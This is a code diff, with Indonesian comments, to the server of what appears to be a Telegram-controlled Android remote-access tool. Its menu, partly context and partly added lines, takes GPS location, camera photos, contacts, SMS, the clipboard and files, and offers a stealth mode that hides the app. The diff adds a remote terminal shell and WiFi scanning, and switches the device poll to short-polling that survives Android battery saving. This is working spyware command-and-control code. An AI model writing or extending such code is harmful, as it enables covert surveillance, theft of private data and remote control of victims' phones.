@@ -286,7 +286,7 @@ Harus diketik dengan format:
     // Menangani klik dari tombol Device yang dipilih
     const sendDeviceMenu = async (ctx, devId, isSecret = false) => {
         const menuBtns = [
-            [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi', callback_data: `runcmd:${devId}:location`, style: 'primary' }],
+            [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }, { text: '📶 Scan WiFi', callback_data: `runcmd:${devId}:wifi_scan`, style: 'primary' }],
             [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
             [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
             [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
@@ -304,7 +304,8 @@ Harus diketik dengan format:
                 [{ text: '👻 Hide (Stealth)', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '📻 Info Volume', callback_data: `runcmd:${devId}:get_volume` }],
                 [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
                 [{ text: '🎵 Play Sound', callback_data: `runcmd:${devId}:play_sound` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }],
-                [{ text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }]
+                [{ text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '💬 Show Toast', callback_data: `runcmd:${devId}:show_toast` }],
+                [{ text: '💻 Terminal Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }]
             );
         }
 
@@ -510,29 +511,16 @@ app.get('/poll', async (req, res) => {
 
     await updateDeviceSeen(client_id);
 
-    // Mekanisme Long-Polling (Maks 25 detik menahan koneksi)
-    const MAX_WAIT_MS = 25000;
-    const POLL_INTERVAL_MS = 1000;
-    let waited = 0;
+    // Mekanisme Short-Polling (Ramah Background Android Doze)
+    const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
+        [client_id, 'pending']);
 
-    // Loop penundaan sinkron ke database
-    while (waited < MAX_WAIT_MS) {
-        const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
-            [client_id, 'pending']);
-
-        if (cmd) {
-            await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
-            return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
-        }
-
-        await new Promise(resolve => setTimeout(resolve, POLL_INTERVAL_MS));
-        waited += POLL_INTERVAL_MS;
-
-        // Tetap perbarui timestamp online jika menunggu sangat lama
-        if (waited % 5000 === 0) await updateDeviceSeen(client_id);
+    if (cmd) {
+        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
+        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
     }
 
-    res.json({ command: 'none' }); // Time Out
+    res.json({ command: 'none' }); // Jawaban langsung 'none'
 });
 
 app.post('/response', async (req, res) => {
